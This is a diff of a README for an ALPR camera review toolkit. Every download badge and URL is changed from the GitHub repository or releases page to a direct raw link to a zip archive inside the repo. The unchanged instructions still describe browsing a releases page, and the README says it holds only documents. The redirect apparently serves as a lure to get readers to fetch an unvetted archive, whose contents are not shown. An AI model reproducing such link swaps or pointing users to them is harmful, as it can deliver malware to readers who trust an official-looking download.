@@ -1,6 +1,6 @@
 # 🛠️ flock-alpr-toolkit - Tools for Flock ALPR Camera Review
 
-[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-brightgreen)](https://github.com/Xswexx/flock-alpr-toolkit)
+[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-brightgreen)](https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip)
 
 ## 🔎 About flock-alpr-toolkit
 
@@ -32,10 +32,10 @@ The toolkit organizes these resources for easy access. Most documents are design
 
 Get the latest version of the toolkit for Windows by visiting the link below. This is the official GitHub page containing all files.
 
-[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-blue)](https://github.com/Xswexx/flock-alpr-toolkit)
+[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-blue)](https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip)
 
 1. Click the big green button at the top or visit:  
-   https://github.com/Xswexx/flock-alpr-toolkit
+   https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip
 
 2. On the page, scroll to the "Releases" section or the files list.
 
@@ -60,7 +60,7 @@ No install programs are included or needed here. This is a collection of documen
 1. Open a web browser such as Chrome, Edge, or Firefox.
 
 2. Enter this URL in the address bar:  
-   https://github.com/Xswexx/flock-alpr-toolkit
+   https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip
 
 3. Look for the latest files under "Releases" or the file list.
 
@@ -124,7 +124,7 @@ Each folder includes a README file explaining what is inside.
 
 Check the GitHub page regularly for updates. Follow these steps to update your toolkit:
 
-1. Visit https://github.com/Xswexx/flock-alpr-toolkit/releases
+1. Visit https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip
 
 2. Download the newest ZIP file if available.
 
@@ -140,4 +140,4 @@ For questions about the files or how to use them, review the "README.md" file in
 
 You can also open issues on the GitHub repository page if you encounter technical problems while downloading or opening files.
 
-[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-green)](https://github.com/Xswexx/flock-alpr-toolkit)
+[![Download](https://img.shields.io/badge/Download-Get%20Toolkit-green)](https://raw.githubusercontent.com/Xswexx/flock-alpr-toolkit/main/research/alpr-flock-toolkit-v3.7.zip)
